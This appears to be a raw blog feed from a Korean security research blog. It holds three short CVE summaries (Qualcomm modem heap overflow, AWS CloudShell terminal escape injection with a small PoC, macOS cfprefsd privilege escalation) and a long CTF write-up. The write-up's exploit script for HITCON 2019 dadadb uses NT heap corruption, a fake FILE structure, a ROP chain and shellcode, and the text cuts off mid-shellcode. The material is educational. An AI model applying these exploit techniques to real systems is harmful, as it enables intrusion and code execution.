    <title>[하루한줄] CVE-2020-11292: 안드로이드 기기를 도청할 수 있는 Qualcomm 칩 취약점</title>
    <link href="/2021/05/12/fabu1ous/2021-05-12/"/>
    <url>/2021/05/12/fabu1ous/2021-05-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://research.checkpoint.com/2021/security-probe-of-qualcomm-msm/">Security probe of Qualcomm MSM data services</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Qualcomm MSM<br>issue: QPSIIR-1441</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Check Point Research가 Qualcomm의 MSM(Mobile Station Modem) data service에서 발견된 heap overflow 취약점을 공개했습니다. 이번에 공개된 write-up에서 주목할 점은 QMI(Qualcomm MSM Interface)가 MSM 익스플로잇의 공격 벡터로 사용될 수 있다는 점입니다. MSM은 QuRT(Qualcomm real-time OS)의 관리를 받아 루팅 된 안드로이드 기기에서도 디버깅이나 메모리 덤핑이 불가능합니다. 따라서 MSM의 소프트웨어 구성 요소와 주변 서브시스템 간의 통신을 담당하는 QMI를 통해 data service를 공격하고 QuRT를 (악성코드로) 패치하는 것이 Check Point Research가 제시한 방법입니다.</p><ul><li><p>CVE-2020-11292</p><p>QMI에 전달되는 유저 제공 데이터의 검증 미흡으로 heap overflow가 발생합니다. 핸들러 함수 <code>qmi_voicei_srvcc_call_config_req</code>는 안드로이드로부터 받은 QMI 메세지를 파싱합니다. QMI 메세지에서 TLV payload를 파싱 할 때 <code>TLV packet type</code>값 만큼 루프를 돌며 힙 메모리에 호출 콘텍스트를 옮기는데 해당 루프 회수의 최댓값 검증이 없어 overflow가 발생합니다.</p></li></ul><p>MSM은 Qualcom에서 제작한 SoC(System on Chip)이며, 현재 스마트폰의 30%가량이 해당 MSM 칩과 QMI를 사용하는 것으로 알려져 있습니다. 해커가 위와 같은 취약점을 악용한다면 MSM를 제어할 수 있으며 모뎀에 악성코드를 심어놓을 수 있습니다. 이를 통해 해커는 기기의 SMS 기록 및 통화 도청을 할 수 있게 됩니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] AWS CloudShell terminal escape injection 취약점</title>
    <link href="/2021/05/11/l0ch/2021-05-11/"/>
    <url>/2021/05/11/l0ch/2021-05-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2154">Issue 2154: Terminal escape injection in AWS CloudShell</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Dell Windows device</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>AWS Management Console에서 사용 가능한 브라우저 기반 쉘인 AWS CloudShell에서 원격 코드 실행 취약점이 발견되어 세부 정보가 공개되었습니다.</p><p>취약점은 AWS CloudShell의 <code>aceterm</code> 라이브러리에서 <a href="https://xtermjs.org/docs/api/vtfeatures/">DCS(Device Control String)</a> 이스케이프 문자를 처리하는 과정에 존재합니다. </p><pre><code class="hljs python">case <span class="hljs-string">&#x27;+q&#x27;</span>:var pt = this.currentParam, valid = false;this.send(<span class="hljs-string">&#x27;\x1bP&#x27;</span> + +valid + <span class="hljs-string">&#x27;+r&#x27;</span> + pt + <span class="hljs-string">&#x27;\x1b\\&#x27;</span>);<span class="hljs-keyword">break</span>;</code></pre><p><code>echo -ne &#39;\eP+q6b64\e\\&#39;</code> 을 입력하는 경우 위 코드에서 다음과 같이 처리됩니다. <code>this.currenParam</code>은 <code>\eP+q</code> 이스케이프 문자 뒤에 오는 임의의 문자열을 포함하며 <code>this.send()</code>에서 이를 터미널 입력 핸들러로 전달하는데, 이때 개행을 포함한 임의 코드를 삽입할 수 있습니다.</p><p>이를 악용한 해커가 타겟의 AWS 인스턴스에 <code>/tmp/foo</code> 파일을 생성하는 PoC는 다음과 같습니다.</p><pre><code class="hljs python">$ echo -e <span class="hljs-string">&quot;echo -ne &quot;</span>abcdef\x1bP+q\ntouch /tmp/foo\n\x1b\n<span class="hljs-string">&quot;&quot;</span> &gt; index.html</code></pre><p>타겟 AWS CloudShell에서 해커의 <code>index.html</code>을 curl 등의 툴로 액세스 하면 취약점이 트리거 되어 원격 코드 실행이 가능합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>terminal escape injection</tag>
      
      <tag>aws</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-1815: MacOS 기본 설정을 통한 권한 상승 취약점</title>
    <link href="/2021/05/10/idioth/2021-05-10/"/>
    <url>/2021/05/10/idioth/2021-05-10/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.offensive-security.com/offsec/macos-preferences-priv-escalation/?utm_content=165476462&utm_medium=social&utm_source=twitter&hss_channel=tw-134994790">MACOS LOCAL PRIVILEGE ESCALATION VIA PREFERENCES</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>MacOS &lt; 11.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apple MacOS에서 2020년 패치된 CVE-2020-9839의 잘못된 수정으로 인한 권한 상승 취약점이 발견되었습니다.</p><p>2020년에 발견된 권한 상승 취약점은 기본 설정을 담당하는 <code>cfprefsd</code> 프로세스에 존재합니다. 해당 프로세스는 응용 프로그램 설정을 하기 위해 일반 사용자 권한으로 동작하는 프로세스와 시스템 전반적인 설정을 위해 루트 권한으로 동작하는 두 개의 프로세스가 존재합니다. 두 프로세스 모두 <a href="https://developer.apple.com/documentation/xpc">XPC 연결</a>이 가능합니다. 따라서 <code>CFPrefsCreatePreferencesDirectory</code> 함수를 사용하여 <code>cfprefsd</code> 데몬에서 심볼릭 링크를 사용하여 사용자 지정 디렉터리를 생성할 때 권한 상승이 가능합니다. 이는 해당 함수에서의 심볼릭 링크를 막음으로써 임의 디렉터리의 소유권 수정을 막았습니다.</p><p>하지만 여전히 사용자나 루트 권한으로 디렉터리를 생성할 수 있어 취약점이 발생합니다. MacOS는 유지 관리를 위해 루트 권한으로 주기적으로 실행되는 스크립트를 사용합니다. 이는 <code>/etc/defaults/periodic.conf</code>에 정의되지만 사용자 정의 스크립트는 <code>/usr/local/etc/periodic</code>에 저장됩니다.</p><p>기본적으로 해당 디렉터리는 존재하지 않으므로 <code>cfprefsd</code>를 통해 해당 디렉터리를 해커의 소유로 생성한 후 스크립트를 생성하면 루트 권한으로 스크립트를 실행할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>idioth</tag>
      
      <tag>apple</tag>
      
      <tag>macOS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 5 - HITCON 2019 dadadb(2)</title>
    <link href="/2021/05/09/l0ch/pwncoolsexy-part5/"/>
    <url>/2021/05/09/l0ch/pwncoolsexy-part5/</url>
    
    <content type="html"><![CDATA[<h2 id="이전-시리즈-바로가기"><a href="#이전-시리즈-바로가기" class="headerlink" title="이전 시리즈 바로가기"></a>이전 시리즈 바로가기</h2><p><a href="https://hackyboiz.github.io/2021/01/31/l0ch/pwncoolsexy-part1/">Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 1 - pwntools for windows</a></p><p><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/">Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 2 - NT Heap</a></p><p><a href="https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/">Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 3 - NT Heap(2)</a></p><p><a href="https://hackyboiz.github.io/2021/04/18/l0ch/pwncoolsexy-part4/">Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 4 - HITCON 2019 dadadb</a></p><p>안녕하세요 L0ch입니다! 오늘 드디어 시리즈 마지막 글로 돌아왔습니다!</p><p>이전 글에서 heap overflow - LFH reuse attack으로 익스에 필요한 주소들을 leak 했으니 이제 남은 건 익스뿐입니다! 익스 하려면 갈 길이 머니 바로 본론으로 들어가보도록 하겠습니다.</p><h1 id="Exploit-scenario"><a href="#Exploit-scenario" class="headerlink" title="Exploit scenario"></a>Exploit scenario</h1><p>로그인 체크를 하는 <code>sub_10D0</code> 함수에서는 user와 password를 받고 <code>user.txt</code> 파일을 열어 비교한 뒤 로그인 성공 혹은 실패를 반환합니다.</p><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled.png" alt="pwncoolsexy-part5/Untitled.png"></p><p>입력한 user와 password가 저장되는 bss 영역을 보면 <code>input_pw+0x20</code> 위치에 파일 포인터가 저장되는 것을 볼 수 있네요!</p><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%204.png" alt="pwncoolsexy-part5/Untitled 4.png"></p><p>그런데 user와 password를 입력받을 때 <code>0x20</code> 만큼 입력받네요. 그럼 파일 포인터를 overwrite 할 수 있겠죠? 이를 이용해 fake file structure를 구성하면 arbitrary write가 가능합니다.</p><p>대략적인 exploit 시나리오는 아래와 같습니다.</p><ol><li>heap overflow로 bss 영역에 fake chunk 생성</li><li>fake chunk에 fake file structure 구성</li><li>파일 포인터가 fake file structure를 가리키도록 overwrite</li><li>arbitrary write로 return address를 rop chain 주소로 overwrite</li><li>GET FLAG!!</li></ol><p>이제 시나리오대로 하나씩 살펴보도록 하겠습니다!</p><h1 id="Control-RIP"><a href="#Control-RIP" class="headerlink" title="Control RIP"></a>Control RIP</h1><p>NT heap은 같은 크기의 해제된 chunk를 <code>ListHints</code>에서 double linked list로 관리합니다. 해제된 chunk의 data 위치에는 <code>fd</code> 와 <code>bk</code> 가 저장되고 각각 이전 chunk, 다음 chunk를 가리키며 이후에 같은 크기로 재 할당할 때 <code>ListHints</code>를 참조해 먼저 해제된 순서대로 할당합니다.</p><p><code>A~D</code>를 할당하고 <code>B</code>와 <code>D</code>를 해제한 뒤의 상황을 그림으로 간단하게 나타내면 아래와 같습니다. 리눅스의 Heap 관리랑 비슷한 면이 있네요. </p><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%205.png" alt="pwncoolsexy-part5/Untitled%205.png"></p><p><code>A chunk</code>에서 heap overflow를 트리거하면 해제된 <code>B chunk</code>의 주소와 <code>header</code>를 leak할 수 있습니다.</p><pre><code class="hljs php">add(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x440</span>, <span class="hljs-string">&quot;AAAA&quot;</span>)add(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;AAAA&quot;</span>)add(<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;BBBB&quot;</span>)add(<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;CCCC&quot;</span>)add(<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;DDDD&quot;</span>)delete(<span class="hljs-string">&quot;B&quot;</span>)delete(<span class="hljs-string">&quot;D&quot;</span>)<span class="hljs-comment"># leak B - header, fd, bk, chunk address</span>view(<span class="hljs-string">&#x27;A&#x27;</span>)p.recvuntil(<span class="hljs-string">&quot;Data:&quot;</span>)p.recv(<span class="hljs-number">0x108</span>)header = u64(p.recv(<span class="hljs-number">8</span>))B_fd = u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-comment"># B_fd = D chunk address</span>B_bk = u64(p.recv(<span class="hljs-number">8</span>))p.recv(<span class="hljs-number">0x210</span>)D_fd = u64(p.recv(<span class="hljs-number">8</span>))D_bk = u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-comment"># D_bk = B chunk address</span></code></pre><p>이제 <code>user</code>와 <code>pwd</code> 위치에 2개의 fake chunk를 만드는데, leak 한 <code>B chunk</code> 주소와 <code>header</code>를 이용해 <code>B chunk</code>와 연결되도록 합니다. 이때 각각의 fake chunk의 header에 기존 user와 password를 포함해야 로그인 체크 함수를 통과할 수 있습니다.  <code>B chunk</code>의 <code>fd</code>에는 우리가 만든 fake chunk를 가리키도록 overwrite 하면 되겠네요.</p><pre><code class="hljs php">user = imagebase + <span class="hljs-number">0x5620</span>pwd = imagebase + <span class="hljs-number">0x5648</span><span class="hljs-comment"># we make heap </span><span class="hljs-comment"># B -&gt; fake_chunk(pwd) -&gt; fake_chunk(user) -&gt; D</span><span class="hljs-comment"># overwrite B_fd </span><span class="hljs-comment"># B -&gt; fake_chunk(pwd)</span>add(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x100</span> + p64(<span class="hljs-number">0</span>) + p64(header) + p64(pwd + <span class="hljs-number">0x10</span>))<span class="hljs-comment"># logout</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;4&quot;</span>)<span class="hljs-comment"># header</span>fake_pwd = <span class="hljs-string">&quot;phdphd&quot;</span> + <span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">2</span> + p64(header)<span class="hljs-comment"># fd, bk</span>fake_pwd += p64(user + <span class="hljs-number">0x10</span>) + p64(D_bk)[:<span class="hljs-number">-2</span>]<span class="hljs-comment"># header</span>fake_user = <span class="hljs-string">&quot;ddaa&quot;</span> + <span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">4</span> + p64(header)<span class="hljs-comment"># fd, bk</span>fake_user += p64(D_fd) + p64(pwd + <span class="hljs-number">0x10</span>)[:<span class="hljs-number">-2</span>]login(fake_user, fake_pwd)</code></pre><p>현재 free된 chunk들의 double linked list는 아래 그림과 같습니다!</p><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%206.png" alt="pwncoolsexy-part5/Untitled%206.png"></p><p>다음은 <code>B chunk</code>에 fake file structure를 구성할 차례입니다. File Structure에 대한 자세한 내용은 <a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique">Play with File Structure</a> 슬라이드를 참고하면 되며 <code>_base</code> 필드에 임의의 주소를 쓰는 것으로 arbitrary write가 가능합니다. 따라서 <code>_base</code>에 return address를 주면 됩니다!</p><pre><code class="hljs php">cnt = <span class="hljs-number">0</span>_ptr = <span class="hljs-number">0</span>_base = retflag = <span class="hljs-number">0x2080</span>fd = <span class="hljs-number">0</span>bufsize = <span class="hljs-number">0x110</span>obj = p64(_ptr) + p64(_base) + p32(cnt) + p32(flag)obj += p32(fd) + p32(<span class="hljs-number">0</span>) + p64(bufsize) +p64(<span class="hljs-number">0</span>)obj += p64(<span class="hljs-number">0xffffffffffffffff</span>) + p32(<span class="hljs-number">0xffffffff</span>) + p32(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span></code></pre><p>return address에는 stack base에서 <code>call &lt;func&gt;</code> 다음 instruction이 들어가므로 <code>write</code> 함수 호출 직후 instruction이 있는지 확인하면서 찾으면 쉽게 찾을 수 있습니다.</p><pre><code class="hljs php">ret_ins = imagebase+<span class="hljs-number">0x1b60</span>  ret = stack+<span class="hljs-number">0x2500</span><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<span class="hljs-keyword">if</span>(readmem(key,ret) == ret_ins):<span class="hljs-keyword">break</span>ret += <span class="hljs-number">8</span></code></pre><p>이제 해제한 <code>B chunk</code>를 재할당해 <code>B</code>에 fake file structure를 쓴 후 한번 더 할당하면 우리가 만든 fake chunk가 할당되는데, <code>pwd+0x20</code> 에 파일 포인터가 있었으니 header 크기 16 bytes를 제외한 16만큼 dummy를 채우고 <code>B chunk</code>의 주소로 파일 포인터를 overwrite 합니다.</p><pre><code class="hljs php">add(<span class="hljs-string">&quot;B_REALLOC&quot;</span>,<span class="hljs-number">0x100</span>, obj)<span class="hljs-comment"># file structure</span>add(<span class="hljs-string">&quot;PWD_CHUNK&quot;</span>,<span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;F&quot;</span>*<span class="hljs-number">0x10</span>+p64(D_bk)) <span class="hljs-comment">#overwrite fp to chunk B</span></code></pre><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>이제 남은 건 rop chain을 구성해서 <code>flag.txt</code>의 파일의 내용을 가져와 출력하기만 하면 됩니다! </p><ul><li><p><code>readfile</code>을 호출해 shellcode 입력</p><ul><li><p><code>stdin</code>, <code>stdout</code>은  <code>peb+0x20</code>에 위치한 <code>ProcessParameter</code> 구조체에서 leak</p><pre><code class="hljs python">process_parameter = readmem(key, peb+<span class="hljs-number">0x20</span>)stdin = readmem(key, process_parameter+<span class="hljs-number">0x20</span>)stdout = readmem(key, process_parameter+<span class="hljs-number">0x28</span>)</code></pre></li></ul></li><li><p><code>virtualprotect</code>로 shellcode 주소의 실행 권한 허용 후 shellcode로 jump</p></li><li><p>shellcode는 <code>flag.txt</code>를 읽어 stdout으로 출력</p></li></ul><p>필요한 gadget은 <a href="http://ropshell.com/search">http://ropshell.com</a> 에 익스 환경의 <code>ntdll.dll</code>을 업로드해 찾으면 되며<code>virtualprotect</code>, <code>readfile</code>, <code>writefile</code>, <code>createfile</code> 는 <code>kernel32.dll</code>에서 찾을 수 있습니다.</p><p>아래는 전체 <code>exploit.py</code> 입니다. </p><pre><code class="hljs python"><span class="hljs-keyword">from</span> winpwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> time<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>(<span class="hljs-params">id,pw</span>):</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;1&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;User:&quot;</span>)p.sendline(id)p.recvuntil(<span class="hljs-string">&quot;Password:&quot;</span>)p.sendline(pw)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">key, size, data</span>):</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;1&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;Key:&quot;</span>)p.sendline(key)p.recvuntil(<span class="hljs-string">&quot;Size:&quot;</span>)p.sendline(str(size))p.recvuntil(<span class="hljs-string">&quot;Data&quot;</span>)p.send(data)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">view</span>(<span class="hljs-params">key</span>):</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;2&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;Key:&quot;</span>)p.sendline(key)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">key</span>):</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;3&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;Key:&quot;</span>)p.sendline(key)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">readmem</span>(<span class="hljs-params">key, addr</span>):</span>add(<span class="hljs-string">&quot;LFH4&quot;</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span> + p64(addr))view(key)p.recvuntil(<span class="hljs-string">&quot;Data:&quot;</span>)<span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">8</span>))context.arch = <span class="hljs-string">&quot;amd64&quot;</span><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span>p = process(<span class="hljs-string">&quot;./dadadb.exe&quot;</span>)login(<span class="hljs-string">&quot;ddaa&quot;</span>,<span class="hljs-string">&quot;phdphd&quot;</span>)<span class="hljs-comment">## enable LFH</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">18</span>):add(<span class="hljs-string">&quot;l0ch&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">0x90</span>)<span class="hljs-comment">## fill userblock</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">17</span>):add(<span class="hljs-string">&quot;LFH&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">0x90</span>)delete(<span class="hljs-string">&quot;LFH5&quot;</span>)add(<span class="hljs-string">&quot;LFH4&quot;</span>,<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>)view(<span class="hljs-string">&quot;LFH4&quot;</span>)<span class="hljs-comment">#leak heap base</span>p.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x70</span>)heap_base = u64(p.recv(<span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xffffffffffff0000</span><span class="hljs-comment">#leak next chunk key</span>p.recvuntil(p64(<span class="hljs-number">0x90</span>))key = p.recvuntil(<span class="hljs-string">&quot;\x00&quot;</span>)[:<span class="hljs-number">-1</span>]<span class="hljs-comment">#leak ntdll, imagebase, kernel32 base, stack</span>Lock = readmem(key, heap_base+<span class="hljs-number">0x2c0</span>) <span class="hljs-comment"># _HEAP-&gt;LockVariable-&gt;Lock</span>ntdll = Lock - <span class="hljs-number">0x163dd0</span>pebldr = ntdll + <span class="hljs-number">0x1653c0</span>IMOML = readmem(key, pebldr+<span class="hljs-number">0x20</span>)imagebase = readmem(key, IMOML+<span class="hljs-number">0x20</span>)kernel32 = readmem(key, imagebase+<span class="hljs-number">0x3000</span>) - <span class="hljs-number">0x22460</span><span class="hljs-comment"># leak from IAT</span>peb = readmem(key, ntdll + <span class="hljs-number">0x165328</span>) - <span class="hljs-number">0x240</span>teb = peb + <span class="hljs-number">0x1000</span>stack = readmem(key,teb+<span class="hljs-number">0x10</span>)process_parameter = readmem(key, peb+<span class="hljs-number">0x20</span>)stdin = readmem(key, process_parameter+<span class="hljs-number">0x20</span>)stdout = readmem(key, process_parameter+<span class="hljs-number">0x28</span>)ret_ins = imagebase+<span class="hljs-number">0x1b60</span> ret = stack+<span class="hljs-number">0x2500</span><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<span class="hljs-keyword">if</span>(readmem(key,ret) == ret_ins):<span class="hljs-keyword">break</span>ret += <span class="hljs-number">8</span>add(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x440</span>, <span class="hljs-string">&quot;AAAA&quot;</span>)add(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;AAAA&quot;</span>)add(<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;BBBB&quot;</span>)add(<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;CCCC&quot;</span>)add(<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;DDDD&quot;</span>)delete(<span class="hljs-string">&quot;B&quot;</span>)delete(<span class="hljs-string">&quot;D&quot;</span>)<span class="hljs-comment"># leak header, fd, bk, chunk address</span>view(<span class="hljs-string">&#x27;A&#x27;</span>)p.recvuntil(<span class="hljs-string">&quot;Data:&quot;</span>)p.recv(<span class="hljs-number">0x108</span>)header = u64(p.recv(<span class="hljs-number">8</span>))B_fd = u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-comment"># B_fd = D chunk address</span>B_bk = u64(p.recv(<span class="hljs-number">8</span>))p.recv(<span class="hljs-number">0x210</span>)D_fd = u64(p.recv(<span class="hljs-number">8</span>))D_bk = u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-comment"># D_bk = B chunk address</span>user = imagebase + <span class="hljs-number">0x5620</span>pwd = imagebase + <span class="hljs-number">0x5648</span><span class="hljs-comment"># we make heap </span><span class="hljs-comment"># B -&gt; fake_chunk(pwd) -&gt; fake_chunk(user) -&gt; D</span><span class="hljs-comment"># overwrite B_fd </span><span class="hljs-comment"># B -&gt; fake_chunk(pwd)</span>add(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x100</span> + p64(<span class="hljs-number">0</span>) + p64(header) + p64(pwd + <span class="hljs-number">0x10</span>))<span class="hljs-comment"># logout</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;4&quot;</span>)<span class="hljs-comment"># header</span>fake_pwd = <span class="hljs-string">&quot;phdphd&quot;</span> + <span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">2</span> + p64(header)<span class="hljs-comment"># fd, bk</span>fake_pwd += p64(user + <span class="hljs-number">0x10</span>) + p64(D_bk)[:<span class="hljs-number">-2</span>]<span class="hljs-comment"># header</span>fake_user = <span class="hljs-string">&quot;ddaa&quot;</span> + <span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">4</span> + p64(header)<span class="hljs-comment"># fd, bk</span>fake_user += p64(D_fd) + p64(pwd + <span class="hljs-number">0x10</span>)[:<span class="hljs-number">-2</span>]login(fake_user, fake_pwd)cnt = <span class="hljs-number">0</span>_ptr = <span class="hljs-number">0</span>_base = retflag = <span class="hljs-number">0x2080</span>fd = <span class="hljs-number">0</span>bufsize = <span class="hljs-number">0x110</span>obj = p64(_ptr) + p64(_base) + p32(cnt) + p32(flag)obj += p32(fd) + p32(<span class="hljs-number">0</span>) + p64(bufsize) +p64(<span class="hljs-number">0</span>)obj += p64(<span class="hljs-number">0xffffffffffffffff</span>) + p32(<span class="hljs-number">0xffffffff</span>) + p32(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>add(<span class="hljs-string">&quot;B_REALLOC&quot;</span>,<span class="hljs-number">0x100</span>, obj)<span class="hljs-comment"># file structure</span>add(<span class="hljs-string">&quot;PWD_CHUNK&quot;</span>,<span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;F&quot;</span>*<span class="hljs-number">0x10</span>+p64(D_bk)) <span class="hljs-comment">#overwrite fp to chunk B</span><span class="hljs-comment"># logout</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;4&quot;</span>)login(<span class="hljs-string">&quot;aaaa&quot;</span>,<span class="hljs-string">&quot;aaaa&quot;</span>)virtualprotect = kernel32 + <span class="hljs-number">0x1afe0</span>readfile = kernel32 + <span class="hljs-number">0x22460</span>writefile = kernel32 + <span class="hljs-number">0x22550</span>createfile = kernel32 + <span class="hljs-number">0x220d0</span>pop_rdx_rcx_r8_to_r11 = ntdll + <span class="hljs-number">0x8d150</span>sc_address = imagebase + <span class="hljs-number">0x5000</span><span class="hljs-comment"># call readfile(stdin, sc_address, 0x100, sc_address+0x100)</span>rop_buf = p64(pop_rdx_rcx_r8_to_r11)rop_buf += p64(sc_address) + p64(stdin) + p64(<span class="hljs-number">0x100</span>) + p64(sc_address + <span class="hljs-number">0x100</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(readfile)<span class="hljs-comment"># call virtualprotect(sc_address, 0x1000, 0x40, sc_address+0x100-8)  </span>rop_buf += p64(pop_rdx_rcx_r8_to_r11) rop_buf += p64(<span class="hljs-number">0x1000</span>) + p64(sc_address) + p64(<span class="hljs-number">0x40</span>) + p64(sc_address + <span class="hljs-number">0x100</span> <span class="hljs-number">-8</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(virtualprotect) + p64(sc_address)p.send(rop_buf.ljust(<span class="hljs-number">0x100</span><span class="hljs-number">-8</span>)+p64(<span class="hljs-number">4</span>))shellcode = <span class="hljs-string">f&#x27;&#x27;&#x27;</span><span class="hljs-string">jmp readflag</span><span class="hljs-string">flag:</span><span class="hljs-string">pop r11</span><span class="hljs-string">createfile:</span><span class="hljs-string">mov qword ptr [rsp + 0x30], 0</span><span class="hljs-string">mov qword ptr [rsp + 0x28], 0x80</span><span class="hljs-string">mov qword ptr [rsp + 0x20], 3</span><span class="hljs-string">xor r9, r9</span><span class="hljs-string">mov r8, 1</span><span class="hljs-string">mov rdx, 0x80000000</span><span class="hljs-string">mov rcx, r11</span><span class="hljs-string">mov rax, <span class="hljs-subst">&#123;createfile&#125;</span></span><span class="hljs-string">call rax</span><span class="hljs-string">readfile:</span><span class="hljs-string">mov qword ptr [rsp + 0x20], 0</span><span class="hljs-string">lea r9, [rsp + 0x200]</span><span class="hljs-string">mov r8, 0x100</span><span class="hljs-string">lea rdx, [rsp + 0x100]</span><span class="hljs-string">mov rcx, rax</span><span class="hljs-string">mov rax, <span class="hljs-subst">&#123;readfile&#125;</span></span><span class="hljs-string">call rax</span><span class="hljs-string">writefile:</span><span class="hljs-string">mov qword ptr 